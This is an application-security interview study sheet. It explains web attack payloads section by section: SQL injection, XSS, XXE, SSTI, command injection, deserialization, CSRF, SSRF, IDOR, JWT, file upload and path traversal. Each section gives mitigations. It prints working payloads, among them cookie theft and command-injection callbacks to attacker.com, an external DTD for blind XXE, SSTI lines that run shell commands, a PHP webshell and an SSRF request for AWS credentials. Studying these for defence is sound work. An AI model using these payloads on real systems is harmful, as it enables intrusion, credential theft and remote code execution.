# AppSec Payload & Exploitation Reference — Interview Prep
**For: Mandar Patkar | Focus: the "when and why" behind each payload, not just the string**

> Interviewers rarely want the payload alone — they want to know *why that payload, in that situation*. Each section below gives the payload, **how** it works, **why/when** you'd use that specific variant, and the tell-tale signal that makes you reach for it. Lead your answers with the reasoning.

---

# PART 1 — INJECTION

## 1. SQL Injection (SQLi)

**The mental model:** your input breaks out of the data context and becomes part of the SQL command. Everything below is about *confirming* that, then *extracting* data based on *what the app shows you back*.

### 1.1 Detecting / confirming SQLi
| Payload | How it works | When/why you use it |
|---|---|---|
| `'` or `"` | Breaks string quoting → DB throws a syntax error | First probe. A SQL error in the response = likely injectable |
| `' OR '1'='1` | Makes the WHERE clause always true | Classic **auth bypass** / "return all rows". Use on login forms and filters |
| `' AND '1'='2` vs `' AND '1'='1` | One is false (no/different results), one is true (normal results) | **Boolean-based blind** — when the app shows no errors and no data, but behaves differently for true vs false |
| `'||(SELECT '')||'` | String concatenation (Oracle/Postgres) | Confirm injection on DBs that use `||` |
| `1-1` vs `2-1` in a numeric param | If `id=2-1` returns the same as `id=1`, the math ran server-side | Confirm **numeric** injection where there are no quotes to break |

### 1.2 The exact question you were asked — OR vs AND
This trips people up. Here's the clean answer:

- **`OR` is for when you want to make a condition TRUE to pull data OUT** — authentication bypass or forcing all rows to return. `admin' OR '1'='1' --` makes the login query true regardless of password. You use OR when the app *acts on* the row (logs you in, shows results).

- **`AND` is for blind inference — asking the database yes/no questions.** The row already returns; you append `AND <condition>` and watch whether the normal result still appears. `' AND 1=1 --` (page normal) vs `' AND 1=2 --` (page changes/empty) proves you control the logic. You then swap `1=1` for a real question: `' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a' --`. You use AND when the app *doesn't show you data directly* and you have to extract it one bit at a time.

**One-liner for the interview:** "OR is to break authentication or dump everything by forcing truth; AND is for blind extraction, appending a condition to an already-returning row and inferring the answer from whether the response changes."

### 1.3 UNION-based — the other question you got
**When you use UNION:** only when the app **reflects query results back on the page** (e.g., a product listing, search results). UNION lets you append a *second* SELECT whose columns are printed in place of the original data. If the app shows nothing, UNION is useless → fall back to blind.

**The ordered steps (interviewers love this sequence):**
1. **Find the column count** — UNION requires both queries to have the *same number of columns*:
   - `' ORDER BY 1--`, `' ORDER BY 2--` … increase until it errors. Last working number = column count.
   - or `' UNION SELECT NULL--`, `' UNION SELECT NULL,NULL--` … until no error.
2. **Find which columns are visible / which accept strings:**
   - `' UNION SELECT 'a',NULL,NULL--` → see where `a` appears on the page.
3. **Extract data in the visible columns:**
   - `' UNION SELECT username, password, NULL FROM users--`
   - DB version: `' UNION SELECT @@version,NULL,NULL--` (MySQL/MSSQL), `version()` (Postgres)
   - List tables: `' UNION SELECT table_name,NULL FROM information_schema.tables--`
   - List columns: `' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--`

**One-liner:** "UNION only works when results are reflected and column count + types match. I confirm column count with ORDER BY or UNION SELECT NULLs, find a visible string column, then select from information_schema to map the DB and pull data."

### 1.4 Blind SQLi variants
| Type | Payload | Why |
|---|---|---|
| Boolean-based | `' AND 1=1--` / `' AND 1=2--` | Response differs for true/false; infer data bit by bit |
| Time-based | `' AND SLEEP(5)--` (MySQL), `'; WAITFOR DELAY '0:0:5'--` (MSSQL), `' AND pg_sleep(5)--` (Postgres) | **No visible difference at all** — only way to confirm is "did the response take 5s?" Use when boolean gives no signal |
| Error-based | `' AND extractvalue(1,concat(0x7e,version()))--` | App leaks DB errors in the response → smuggle data into the error text |
| Out-of-band (OAST) | `'; EXEC master..xp_dirtree '\\attacker.com\x'--` | No in-band channel; force a DNS/HTTP callback to your server |

### 1.5 WAF bypass / filter evasion (shows depth)
- Comments to break keywords: `UN/**/ION SE/**/LECT`
- Case variation: `uNiOn SeLeCt`
- Encoding: URL-encode, double-encode, or hex (`0x61646d696e` for `admin`)
- Whitespace alternatives: `UNION(SELECT(1))`, tabs/newlines
- `--`, `#`, `/* */` comment terminators to kill the rest of the query

### 1.6 Mitigation (always close with this)
Parameterised queries / prepared statements (the real fix), ORM with proper binding, least-privilege DB account, input validation, stored procedures done safely, WAF as defence-in-depth only.

---

## 2. Cross-Site Scripting (XSS)

**Mental model:** your input is reflected into a page and executed as script. The payload depends entirely on **what HTML/JS context your input lands in.** That context-awareness is what interviewers test.

### 2.1 Basic confirmation
| Payload | When/why |
|---|---|
| `<script>alert(1)</script>` | Baseline, when input lands directly in HTML body |
| `"><script>alert(1)</script>` | When your input is inside an HTML **attribute** — the `">` breaks out of the attribute and tag first |
| `'><script>alert(1)</script>` | Same, when the attribute uses single quotes |
| `<img src=x onerror=alert(1)>` | When `<script>` is filtered — event handler fires on the broken image |
| `<svg onload=alert(1)>` | Shorter, bypasses many filters, fires on load |
| `javascript:alert(1)` | When input lands in an `href`/`src` — clicking runs it |

### 2.2 Context decides the payload (the key insight)
- **HTML body** → `<script>` or `<svg onload>`
- **Inside an attribute** `value="HERE"` → break out first: `"><svg onload=alert(1)>`
- **Inside a JS string** `var x='HERE'` → close the string: `';alert(1)//`
- **Inside a URL/href** → `javascript:alert(1)`
- **DOM sink** (`innerHTML`, `document.write`, `eval`, `location`) → DOM-based; payload never touches the server. Example source→sink: `location.hash` written into `innerHTML`.

**One-liner:** "I don't pick an XSS payload blind — I first identify the context my input reflects into (HTML body, attribute, JS string, URL, or a DOM sink), because that dictates what I need to break out of."

### 2.3 Filter bypass
- Case: `<ScRiPt>`
- No-parentheses: `<svg onload=alert`1`>` (backticks) — mostly legacy
- Encoding: HTML entities, `&#x61;`, URL encoding
- Broken tags: `<img src=x onerror=alert(1)//`
- Alternate events: `onfocus`, `onmouseover`, `autofocus`

### 2.4 Real impact payloads (for "what's the actual risk")
- Cookie theft: `<script>new Image().src='//attacker.com/?c='+document.cookie</script>` (only if no `HttpOnly`)
- Session-riding / CSRF-token theft, keylogging, forced actions via `fetch()` as the victim
- **Account takeover** is the impact to state in triage, not "alert box pops."

### 2.5 Types
- **Reflected** — in the request, echoed in the response; needs victim to click a crafted link
- **Stored** — saved server-side, hits every viewer; highest severity
- **DOM-based** — entirely client-side; server never sees the payload

### 2.6 Mitigation
Context-aware output encoding, CSP, `HttpOnly` cookies, input validation, framework auto-escaping, DOMPurify for rich HTML.

---

## 3. XXE (XML External Entity) Injection

**Mental model:** the app parses attacker XML with external entities enabled, so you declare an entity that points at a file or URL and the parser fetches it.

### 3.1 Core payloads
**File read (classic):**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<foo>&xxe;</foo>
```
*How:* you define `xxe` as an external entity pointing at a local file; when `&xxe;` is rendered in the response, the file contents come back. *When:* the app **reflects parsed XML values** back to you.

**SSRF via XXE:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>
```
*When:* you want to pivot into internal services / cloud metadata through the server.

**Blind XXE (out-of-band)** — when nothing is reflected:
```xml
<!DOCTYPE foo [
  <!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd">
  %ext;
]>
```
with `evil.dtd` on your server defining a parameter entity that exfiltrates a file to your server over HTTP/DNS. *When:* no data comes back in the response → force a callback.

**Billion laughs (DoS)** — nested entity expansion to exhaust memory. Mention only as a availability-impact variant.

### 3.2 Why/when
Reach for XXE whenever you see the app **accepting XML**: SOAP endpoints, SAML, file uploads (`.docx`, `.svg`, `.xml`), REST endpoints with `Content-Type: application/xml`. Signal: it parses XML you control.

### 3.3 Mitigation
Disable DOCTYPE / external entity resolution in the parser (the real fix), use less complex formats (JSON), patch/configure the XML library, input validation.

---

## 4. SSTI (Server-Side Template Injection)

**Mental model:** user input is concatenated into a server-side template (Jinja2, Twig, Freemarker, Velocity), so you inject template syntax that the engine evaluates — often leading to RCE.

### 4.1 Detection (engine-agnostic first)
| Payload | Result meaning |
|---|---|
| `${7*7}` / `{{7*7}}` / `#{7*7}` / `<%= 7*7 %>` | If the response shows **`49`**, the expression was evaluated → SSTI confirmed. If it shows `7*7`, not vulnerable |
| `{{7*'7'}}` | Jinja2 returns `7777777`; Twig returns `49` → **fingerprints the engine** |

**One-liner:** "I confirm SSTI with a math probe like `{{7*7}}` — if it renders `49`, input is evaluated server-side. Then `{{7*'7'}}` fingerprints which engine, because the exploitation path differs per engine."

### 4.2 Exploitation by engine (know at least Jinja2)
**Jinja2 / Python (Flask) — RCE:**
```
{{ ''.__class__.__mro__[1].__subclasses__() }}       # enumerate classes
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}   # shorter modern payload
```
**Twig (PHP):** `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
**Freemarker (Java):** `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`

### 4.3 Why/when
Reach for SSTI when input is reflected into something that looks *rendered* — email templates, custom dashboards, "personalised" pages, anywhere user input becomes part of a generated page server-side. Signal: math in `{{ }}` evaluates.

### 4.4 Mitigation
Don't pass user input into templates; use logic-less/sandboxed templates, pass data as variables not as template source, sandbox the engine.

---

## 5. Command Injection (OS Command)

**Mental model:** input is passed to a shell; you append your own command with a shell metacharacter.

| Payload | How |
|---|---|
| `; id` | `;` ends the first command, runs yours (Linux) |
| `\| id` | Pipe output into your command |
| `&& id` | Run yours if the first succeeds |
| `\|\| id` | Run yours if the first fails |
| `` `id` `` or `$(id)` | Command substitution |
| `& id` (Windows) | Chain on Windows |

**Blind command injection** (no output): time delay `; sleep 10` or OAST `; nslookup attacker.com` / `; curl http://attacker.com`.

**Why/when:** anywhere the app likely shells out — ping tools, file converters, PDF generators, "export" features. **Mitigation:** avoid shell calls, use language APIs, allowlist input, parameterised exec (no shell interpolation).

---

## 6. Insecure Deserialization

**Mental model:** the app deserializes attacker-controlled serialized data; a crafted object triggers code execution via "gadget chains" during deserialization.

### By ecosystem
- **Java:** serialized objects start with magic bytes `AC ED 00 05` (hex) or `rO0` (base64). Tool: **ysoserial** generates gadget chains (`CommonsCollections1`, etc.). You use it when you see a Java serialized blob in a cookie, parameter, or `Content-Type: application/x-java-serialized-object`.
- **PHP:** `unserialize()` on user input. Payload is a crafted serialized object `O:4:"User":1:{s:4:"name";s:5:"admin";}` abusing magic methods (`__wakeup`, `__destruct`). Tool: **PHGGC**.
- **Python:** `pickle.loads()` — a pickle with a `__reduce__` returning `os.system('id')`.
- **.NET:** ViewState / BinaryFormatter — tool **ysoserial.net**.

**Detection signal:** base64 blobs that decode to serialized structures, cookies like `rO0...`, `Content-Type` naming a serialization format.

**Why/when:** cookies, hidden form fields, API tokens, caches, message queues carrying serialized objects. **Impact:** usually RCE → critical. **Mitigation:** never deserialize untrusted data; use data-only formats (JSON) with schema validation; signed/encrypted serialization; allowlist classes.

---

## 7. LDAP / NoSQL / Other injections (quick hits)
- **LDAP injection:** `*)(uid=*))(|(uid=*` — wildcard/filter break for auth bypass or enumeration. When: LDAP-backed login.
- **NoSQL (MongoDB):** `{"username": {"$ne": null}, "password": {"$ne": null}}` or `username[$ne]=1&password[$ne]=1` — operator injection bypasses auth. When: JSON APIs over Mongo.
- **XPath injection:** `' or '1'='1` against XML data stores.
- **CRLF injection:** `%0d%0a` to inject headers / split responses → header injection, log poisoning.
- **Host header injection:** change `Host:` to poison password-reset links / cache.

---

# PART 2 — NON-INJECTION (equally important — don't neglect these)

## 8. CSRF (Cross-Site Request Forgery)

**Mental model:** no payload "string" — the exploit is a crafted *page* that makes the victim's browser fire an authenticated state-changing request, abusing auto-sent cookies.

**PoC (the deliverable):**
```html
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="10000">
</form>
<script>document.forms[0].submit()</script>
```
For GET: `<img src="https://bank.com/transfer?to=attacker&amount=10000">`

**When/why it's valid:** the action is state-changing AND auth relies on cookies alone AND there's no anti-CSRF token / no `SameSite`. **Test:** remove the CSRF token / resubmit from another origin — if it still works, valid.
**Severity:** CSRF on logout = low; on password/email change (→ account takeover) = high.
**Mitigation:** anti-CSRF tokens (synchroniser pattern), `SameSite=Lax/Strict`, verify Origin/Referer, re-auth for sensitive actions.

---

## 9. SSRF (Server-Side Request Forgery)

**Mental model:** you control a URL the *server* fetches; you point it inward.

| Payload target | Why |
|---|---|
| `http://169.254.169.254/latest/meta-data/iam/security-credentials/` | **AWS metadata → steal cloud credentials** (the crown jewel; Capital One). Azure/GCP have their own metadata IPs |
| `http://127.0.0.1:8080/admin` | Reach internal-only admin panels |
| `http://localhost/` , `http://[::1]/` | Loopback access |
| `file:///etc/passwd` | Local file read if the fetcher allows `file://` |
| `http://internal-service:port` | Port-scan / reach internal microservices |

**Filter bypasses (depth):**
- Decimal/octal/hex IP: `http://2130706433/` (= 127.0.0.1)
- `http://127.1/`, `http://0.0.0.0/`
- DNS rebinding, redirect to internal via your own server (`http://attacker.com/redirect→169.254.169.254`)
- `[email protected]` confusion, `#` tricks

**Blind SSRF:** no response body → use OAST (Burp Collaborator) to confirm the callback. Lower severity than one returning internal data/creds.
**When/why:** URL fetchers — webhooks, "import from URL", image/PDF fetch from URL, SSO metadata, PDF generators.
**Mitigation:** outbound allowlist, block link-local/private ranges, disable unused schemes, enforce IMDSv2, network segmentation.

---

## 10. IDOR / Broken Access Control

**Mental model:** no clever string — you change an identifier and the server fails to check ownership.

**Technique, not payload:**
- Increment/decrement IDs: `/api/user/1001/invoice` → try `1000`, `1002`
- Swap UUIDs/IDs captured from a second account
- Change `role=user` → `role=admin` (mass-assignment-adjacent)
- Method/endpoint swap: `GET` allowed, try `PUT`/`DELETE`
- Parameter in body/JSON/cookie, not just URL

**How you prove it (the triage gold standard):** **two accounts.** Log in as A, capture a request to A's object, replay it with B's session (or B's object id). If A can read/modify B's data → confirmed IDOR.
**Severity:** scales with data sensitivity — PII/financial/write-access = high/critical; your own non-sensitive object = none.
**Mitigation:** server-side object-level authorisation on every request; don't rely on unguessable IDs alone; centralised access checks.

---

## 11. Authentication / Session flaws (payload-light, logic-heavy)
- **JWT:**
  - `alg:none` — strip the signature, set header `{"alg":"none"}` → if accepted, forge any token
  - Weak secret — brute-force HS256 secret (hashcat), then re-sign as `admin`
  - `kid` injection / `jku`/`x5u` pointing at your key
  - Algorithm confusion RS256→HS256 (sign with the public key as HMAC secret)
  - *When:* any JWT in Authorization header/cookie. *Fix:* verify signature + alg server-side, validate claims (`exp`, `aud`, `iss`).
- **OAuth:** `redirect_uri` manipulation to steal the `code`, missing `state` (CSRF on callback), token leak via Referer. *Fix:* strict redirect allowlist, verify `state`, PKCE.
- **Brute force / credential stuffing:** no rate limit on login/OTP; reset-token weaknesses.

---

## 12. File Upload → RCE
- Upload a webshell: `shell.php` containing `<?php system($_GET['c']); ?>` then browse to it.
- Bypasses: double extension `shell.php.jpg`, null byte `shell.php%00.jpg` (legacy), content-type spoofing, magic-byte prefixing (`GIF89a;<?php...`), `.phtml`/`.phar` when `.php` blocked, case `shell.PHP`, `.htaccess` upload to remap handlers.
- *When:* any upload that's web-accessible and server-executable. *Fix:* allowlist extensions + content-type + magic bytes, store outside webroot, randomise names, serve from a non-executing domain.

---

## 13. Path Traversal / LFI / RFI
- Traversal: `../../../../etc/passwd`, encoded `..%2f..%2f`, double-encoded `..%252f`, `....//` (filter-stripping bypass)
- Windows: `..\..\..\windows\win.ini`
- LFI → RCE via log poisoning or PHP wrappers: `php://filter/convert.base64-encode/resource=index.php`, `data://`, `expect://`
- *When:* file/`page`/`include`/`download` parameters. *Fix:* canonicalise + allowlist, no user input in file paths.

---

## 14. Open Redirect, Clickjacking, CORS
- **Open redirect:** `?next=https://attacker.com`, bypasses `//attacker.com`, `https:attacker.com`, `?next=https://trusted.com@attacker.com`. Impact alone = low; chains into OAuth token theft / phishing.
- **Clickjacking:** no payload — a PoC HTML that iframes the target with opacity; valid only if `X-Frame-Options`/`frame-ancestors` missing AND a sensitive clickable action exists.
- **CORS:** send `Origin: https://evil.com`; if the response reflects it in `Access-Control-Allow-Origin` **and** `Access-Control-Allow-Credentials: true`, attacker's site can read authenticated data. ACAO `*` without credentials and no sensitive data = low/informative.

---

# PART 3 — THE META-ANSWER (use this framing live)

When an interviewer hands you a payload question, answer in this order every time:

1. **What context / signal makes you reach for it** ("input reflects into a JS string", "app fetches a URL I control", "Java serialized blob in the cookie").
2. **The payload + how it works mechanically.**
3. **Which variant and why** (OR = force truth / bypass; AND = blind inference; UNION = results reflected; time-based = no visible signal at all).
4. **Impact** (what an attacker actually gains).
5. **Mitigation** (the real fix, then defence-in-depth).

That structure is exactly what separates "memorised a payload" from "understands the vulnerability" — and it's what every one of your interviewers is probing for.

---

### Highest-value things to over-prepare (based on your reported sticking points)
- **SQLi OR vs AND vs UNION vs blind** — Section 1.2 & 1.3. Be able to say *when* each, not just the string.
- **XSS context-dependence** — Section 2.2. "The context dictates the payload."
- **SSTI confirm→fingerprint→exploit** flow — Section 4.1.
- **XXE file-read vs blind/OOB** — Section 3.
- **Deserialization: recognise the blob, name the tool (ysoserial)** — Section 6.
- **SSRF metadata endpoint + why it's critical** — Section 9.
- **IDOR: the two-account proof** — Section 10.
